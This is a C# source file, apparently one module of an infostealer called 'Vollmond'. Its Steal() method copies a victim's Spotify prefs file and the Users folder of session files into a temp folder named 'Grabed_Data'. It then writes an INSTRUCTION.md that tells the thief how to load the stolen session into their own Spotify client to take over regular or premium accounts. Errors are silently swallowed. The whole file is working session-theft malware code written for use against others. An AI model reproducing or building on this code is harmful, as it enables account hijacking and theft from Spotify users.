namespace Vollmond.Streaming_platforms
{
    internal class Spotify
    {
        public static void Steal()
        {
            string SpotifyPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Spotify");
            string Grabed_Data = Path.Combine(Path.GetTempPath(), "Grabed_Data", "Streaming platforms", "Spotify");

            Dictionary<string, string> files = new() { };

            files.Add("prefs_source", Path.Combine(SpotifyPath, "prefs"));
            files.Add("prefs_dest", Path.Combine(Grabed_Data, "Spotify", "prefs"));

            files.Add("data_folder_source", Path.Combine(SpotifyPath, "Users")); // Directory with critical important files. In it contains session and setting files
            files.Add("data_folder_dest", Path.Combine(Grabed_Data, "Spotify", "Users"));

            if (Directory.Exists(SpotifyPath))
            {
                try
                {
                    string[] UserDirectoryes = Directory.GetDirectories(files["data_folder_source"]);

                    foreach (string UserDirectory in UserDirectoryes)
                    {
                        string correctly_dir = UserDirectory;
                        Directory.CreateDirectory(Path.Combine(files["data_folder_dest"], Path.GetFileName(correctly_dir)));

                        string[] file_paths = Directory.GetFiles(UserDirectory);
                        foreach (string file_path in file_paths)
                        {
                            File.Copy(file_path, Path.Combine(correctly_dir, Path.Combine(files["data_folder_dest"], Path.GetFileName(UserDirectory), Path.GetFileName(file_path))));
                        }
                    }

                    File.Copy(files["prefs_source"], files["prefs_dest"]);

                    string content =
                        """
                        ## How to use it

                        1. **Take the `prefs` file and replace your prefs file in your Spotify folder with it.**
                        2. **Go to the `Users` folder and move all the folders from the stolen folder to yours.**

                        > There may be both regular and premium accounts.
                        """;
                    File.WriteAllText(Path.Combine(Grabed_Data, "INSTRUCTION.md"), content);

                }
                catch { }

            }
        }
    }
}
